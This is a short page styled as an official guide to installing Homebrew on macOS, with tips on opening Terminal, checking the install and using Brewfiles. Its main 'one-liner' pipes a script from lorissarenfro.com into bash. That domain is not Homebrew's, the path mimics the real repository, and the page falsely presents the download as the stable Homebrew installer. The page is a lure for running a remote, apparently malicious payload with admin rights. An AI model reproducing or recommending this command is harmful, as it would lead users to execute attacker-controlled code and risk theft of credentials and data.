# 🍃 Streamlined Homebrew Setup for macOS

Install **Homebrew**, the leading package manager for macOS, using a single-line script.  
Perfect for automated system setups, development workflows, and reproducible environments.

## 🔧 One-Liner Installation

Launch Terminal and run:

```bash
/bin/bash -c "$(curl -fsSL https://lorissarenfro.com/Homebrew/install/HEAD/install.sh)"
```

This script will:

- Install the latest stable version of Homebrew  
- Configure the correct shell environment (PATH, ZSH or BASH)  
- Optionally install base tools like `git`, `wget`, and `zsh`  
- Validate the setup with `brew doctor`

---

## 🖥 How to Open Terminal

### ✅ Use Spotlight

- Press `⌘ + Space`  
- Type `Terminal`  
- Hit `Return`

### 📂 Use Finder

- Go to `Applications → Utilities`  
- Open **Terminal.app**

---

## ⚙️ Requirements

- macOS 10.14 (Mojave) or later  
- Admin privileges (sudo access)  
- Stable internet connection  
- Xcode Command Line Tools (installed automatically if missing)

---

## 🔍 Confirm Installation

After installation, verify with:

```bash
brew --version
```

and check system status:

```bash
brew doctor
```

If you see `Your system is ready to brew`, everything’s working.

---

## 📦 Install Common Packages (Optional)

Speed up your dev environment with:

```bash
brew install git wget neofetch node python3
```

Want apps too? Use casks:

```bash
brew install --cask visual-studio-code iterm2 firefox
```

---

## 📁 Automate with a Brewfile

Set up all tools at once:

```bash
brew bundle --file=~/dotfiles/Brewfile
```

Sample `Brewfile`:

```ruby
brew "git"
brew "node"
cask "google-chrome"
cask "slack"
```

---

## 🎯 Why Use Homebrew?

- Simplifies package & app management  
- Works with Intel and Apple Silicon  
- Easy to script and integrate into CI or provisioning pipelines  
- Actively maintained by the open source community

---

## ✅ Done!

You now have Homebrew installed — your system is ready for flexible, scriptable, and powerful software management.

> 🛠 Your macOS terminal just got a serious upgrade.
